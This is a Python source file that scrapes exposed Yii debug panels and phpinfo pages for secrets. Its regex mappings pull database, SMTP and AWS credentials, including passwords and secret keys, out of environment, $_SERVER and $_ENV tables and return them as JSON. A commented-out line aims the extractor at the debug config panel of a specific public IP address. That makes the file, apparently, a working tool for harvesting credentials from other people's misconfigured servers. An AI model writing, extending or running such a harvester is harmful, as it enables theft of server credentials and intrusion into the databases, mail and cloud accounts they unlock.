# cython: language_level=3

# Code for yii debug disclosure , phpinfo debug disclosure


import json
import re


class Extact_info_Common_2:
    def __init__(self):
        pass

    def run(self, html_text):
        return json.loads(self.extract_yii_details(html_text))

    def extract_yii_details(self, html_text):
        # Dictionnaires pour mapper les clés HTML avec les clés JSON pour les différentes bases de données

        environnement_db_first_config = {
            "DB_NAME": "db name",
            "DB_PASSWORD": "db password",
            "DB_USERNAME": "db username",
            "DB_HOST": "db host",
        }

        environnement_db_second_config = {
            "WP_DB_NAME": "db name",
            "WP_DB_PASSWORD": "db password",
            "WP_DB_USERNAME": "db username",
            "WP_DB_HOST": "db host",
        }

        environnement_smtp_first_config = {
            "MAIL_HOST": "smtp host",
            "MAIL_USERNAME": "smtp username",
            "MAIL_PASSWORD": "smtp password",
            "MAIL_PORT": "smtp port",
            "MAIL_ENCRYPTION": "smtp encryption",
        }

        environnement_aws_first_config = {
            "AWS_BUCKET_KEY": "aws key id",
            "AWS_BUCKET_SECRET ": "aws secret key",
            "AWS_BUCKET_REGION": "aws region",
        }

        php_var_server_db_first_config = {
            "$_SERVER['DB_NAME']": "db name",
            "$_SERVER['DB_PASSWORD']": "db password",
            "$_SERVER['DB_USERNAME']": "db username",
            "$_SERVER['DB_HOST']": "db host",
        }

        php_var_server_db_second_config = {
            "$_SERVER['WP_DB_NAME']": "db name",
            "$_SERVER['WP_DB_PASSWORD']": "db password",
            "$_SERVER['WP_DB_USERNAME']": "db username",
            "$_SERVER['WP_DB_HOST']": "db host",
        }

        php_var_server_db_third_config = {
            "$_SERVER['DB_CONNECTION']": "db connection",
            "$_SERVER['DB_HOST']": "db host",
            "$_SERVER['DB_PORT']": "db port",
            "$_SERVER['DB_DATABASE']": "db name",
            "$_SERVER['DB_USERNAME']": "db username",
            "$_SERVER['DB_PASSWORD']": "db password",
        }

        php_var_server_db_four_config = {
            "$_SERVER['DB_PRIMO_CONNECTION']": "db connection",
            "$_SERVER['DB_PRIMO_HOST']": "db host",
            "$_SERVER['DB_PRIMO_PORT']": "db port",
            "$_SERVER['DB_PRIMO_DATABASE']": "db name",
            "$_SERVER['DB_PRIMO_USERNAME']": "db username",
            "$_SERVER['DB_PRIMO_PASSWORD']": "db password",
        }

        php_var_server_aws_first_config = {
            "$_SERVER['AWS_BUCKET_KEY']": "aws key id",
            "$_SERVER['AWS_BUCKET_SECRET']": "aws secret key",
            "$_SERVER['AWS_BUCKET_REGION']": "aws region",
        }

        php_var_server_aws_second_config = {
            "$_SERVER['S3_KEY']": "aws key id",
            "$_SERVER['S3_SECRET']": "aws secret key",
        }

        php_var_server_smtp_first_config = {
            "$_SERVER['MAIL_HOST']": "smtp host",
            "$_SERVER['MAIL_USERNAME']": "smtp username",
            "$_SERVER['MAIL_PASSWORD']": "smtp password",
            "$_SERVER['MAIL_PORT']": "smtp port",
            "$_SERVER['MAIL_ENCRYPTION']": "smtp encryption",
        }

        php_var_server_smtp_second_config = {
            "$_SERVER['SMTP_HOST']": "smtp host",
            "$_SERVER['SMTP_USER']": "smtp username",
            "$_SERVER['SMTP_PASSWORD']": "smtp password",
            "$_SERVER['SMTP_PORT']": "smtp port",
            "$_SERVER['SMTP_ENCRYPTION']": "smtp encryption",
        }

        php_var_server_smtp_third_config = {
            "$_SERVER['REDIRECT_SMTP_HOST']": "smtp host",
            "$_SERVER['REDIRECT_SMTP_USER']": "smtp username",
            "$_SERVER['REDIRECT_SMTP_PASSWORD']": "smtp password",
            "$_SERVER['REDIRECT_SMTP_PORT']": "smtp port",
            "$_SERVER['REDIRECT_SMTP_ENCRYPTION']": "smtp encryption",
        }

        php_var_env_db_first_config = {
            "$_ENV['DB_NAME']": "db name",
            "$_ENV['DB_PASSWORD']": "db password",
            "$_ENV['DB_USERNAME']": "db username",
            "$_ENV['DB_HOST']": "db host",
        }

        php_var_env_db_second_config = {
            "$_ENV['DB_CONNECTION']": "db connection",
            "$_ENV['DB_HOST']": "db host",
            "$_ENV['DB_PORT']": "db port",
            "$_ENV['DB_DATABASE']": "db name",
            "$_ENV['DB_USERNAME']": "db username",
            "$_ENV['DB_PASSWORD']": "db password",
        }

        php_var_env_db_third_config = {
            "$_ENV['DB_PRIMO_CONNECTION']": "db connection",
            "$_ENV['DB_PRIMO_HOST']": "db host",
            "$_ENV['DB_PRIMO_PORT']": "db port",
            "$_ENV['DB_PRIMO_DATABASE']": "db name",
            "$_ENV['DB_PRIMO_USERNAME']": "db username",
            "$_ENV['DB_PRIMO_PASSWORD']": "db password",
        }

        php_var_env_aws_first_config = {
            "$_ENV['AWS_BUCKET_KEY']": "aws key id",
            "$_ENV['AWS_BUCKET_SECRET']": "aws secret key",
            "$_ENV['AWS_BUCKET_REGION']": "aws region",
        }

        php_var_env_aws_second_config = {
            "$_ENV['S3_KEY']": "aws key id",
            "$_ENV['S3_SECRET']": "aws secret key",
        }

        php_var_env_smtp_first_config = {
            "$_ENV['MAIL_HOST']": "smtp host",
            "$_ENV['MAIL_USERNAME']": "smtp username",
            "$_ENV['MAIL_PASSWORD']": "smtp password",
            "$_ENV['MAIL_PORT']": "smtp port",
            "$_ENV['MAIL_ENCRYPTION']": "smtp encryption",
        }

        # enviromment
        primary_db_details_envrionnement = self.extract_details(
            environnement_db_first_config, html_text
        )
        secondary_db_details_envrionnement = self.extract_details(
            environnement_db_second_config, html_text
        )
        primary_smtp_details_environnement = self.extract_details(
            environnement_smtp_first_config, html_text
        )
        primary_aws_details_envrionnement = self.extract_details(
            environnement_aws_first_config, html_text
        )

        # php var server
        primary_db_details_php_var_server = self.extract_details(
            php_var_server_db_first_config, html_text
        )
        secondary_db_details_php_var_server = self.extract_details(
            php_var_server_db_second_config, html_text
        )
        third_db_details_php_var_server = self.extract_details(
            php_var_server_db_third_config, html_text
        )
        four_db_details_php_var_server = self.extract_details(
            php_var_server_db_four_config, html_text
        )
        primary_smtp_details_php_var_server = self.extract_details(
            php_var_server_smtp_first_config, html_text
        )
        secondary_smtp_deatails_php_var_server = self.extract_details(
            php_var_server_smtp_second_config, html_text
        )
        primary_aws_details_php_var_server = self.extract_details(
            php_var_server_aws_first_config, html_text
        )
        secondary_aws_details_php_var_server = self.extract_details(
            php_var_server_aws_second_config, html_text
        )

        # php var env
        primary_db_details_php_var_env = self.extract_details(
            php_var_env_db_first_config, html_text
        )
        secondary_db_details_php_var_env = self.extract_details(
            php_var_env_db_second_config, html_text
        )
        third_db_details_php_var_env = self.extract_details(
            php_var_env_db_third_config, html_text
        )
        primary_aws_details_php_var_env = self.extract_details(
            php_var_env_aws_first_config, html_text
        )
        secondary_aws_details_php_var_env = self.extract_details(
            php_var_env_aws_second_config, html_text
        )
        primary_smtp_details_php_var_env = self.extract_details(
            php_var_env_smtp_first_config, html_text
        )

        db_details = [
            primary_db_details_envrionnement,
            secondary_db_details_envrionnement,
            primary_db_details_php_var_server,
            secondary_db_details_php_var_server,
            third_db_details_php_var_server,
            four_db_details_php_var_server,
            primary_db_details_php_var_env,
            secondary_db_details_php_var_env,
            third_db_details_php_var_env,
        ]

        aws_details = [
            primary_aws_details_envrionnement,
            primary_aws_details_php_var_server,
            secondary_aws_details_php_var_server,
            primary_aws_details_php_var_env,
            secondary_aws_details_php_var_env,
        ]

        smtp_details = [
            primary_smtp_details_environnement,
            primary_smtp_details_php_var_server,
            secondary_smtp_deatails_php_var_server,
            primary_smtp_details_php_var_env,
        ]

        unique_db_details = self.remove_duplicates_in_dict(db_details)
        unique_aws_details = self.remove_duplicates_in_dict(aws_details)
        unique_smtp_details = self.remove_duplicates_in_dict(smtp_details)

        final_json = {
            "database": unique_db_details,
            "aws": unique_aws_details,
            "smtp": unique_smtp_details,
        }

        return json.dumps(final_json, indent=4)

    def extract_details(self, keys_mapping, html_text):
        details = {}
        for html_key, json_key in keys_mapping.items():
            # Notez que les guillemets simples sont échappés et entourés de guillemets doubles
            pattern = rf"<td class=\"e\">{re.escape(html_key)}</td><td class=\"v\">(.*?)\s*</td>"
            match = re.search(pattern, html_text)
            if match:
                details[json_key] = match.group(1)
            else:
                pattern = (
                    rf"<td class=\"e\">{html_key}\s*</td><td class=\"v\">(.*?)\s*</td>"
                )
                match = re.search(pattern, html_text)
                if match:
                    details[json_key] = match.group(1)
                else:
                    details[json_key] = None  # ou mettre une valeur par défaut
        return details

    def remove_duplicates_in_dict(self, details_list):
        unique_details = []
        for detail in details_list:
            # Vérifie si toutes les valeurs dans le dictionnaire sont None
            if any(value is None for value in detail.values()):
                continue  # Ignore les dictionnaires avec que des None
            if detail not in unique_details:
                unique_details.append(detail)
        return unique_details


# rep = requests.get('http://3.74.250.29/debug/default/view?panel=config' , timeout=10 , allow_redirects=True , verify=False).text

# print(Extact_info_YII().run(rep))
